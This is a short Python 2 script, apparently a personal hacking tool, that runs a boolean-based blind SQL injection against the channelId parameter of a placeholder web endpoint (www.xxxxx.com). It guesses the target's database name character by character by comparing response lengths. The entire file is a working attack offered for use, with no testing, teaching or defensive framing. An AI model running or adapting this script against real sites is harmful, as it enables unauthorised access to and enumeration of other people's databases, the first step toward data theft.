#coding=utf-8

import urllib2

class sqli:
    def __init__(self):
        self.payload="abcdefghijklmnopqrstuvwxyz0123456789@_."
        self.cookie={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',}
        self.user=''

    def userscan(self):
        for i in range(1,4):
            for payloads in self.payload:
                try:
                    url_l=urllib2.urlopen('http://www.xxxxx.com/controller/goods/getcategorys?channelId=454+and+mid(lower(database()),%s,1)="%s"' % (i,payloads))
                    url_t=url_l.read()
                    if len(url_t)>20000:
                        self.user += payloads
                        print self.user
                    else:
                        print '*',
                except Exception,e:
                    pass
        print "\nDatabase:"+self.user

if __name__ == '__main__':
    user=sqli()
    user.userscan()
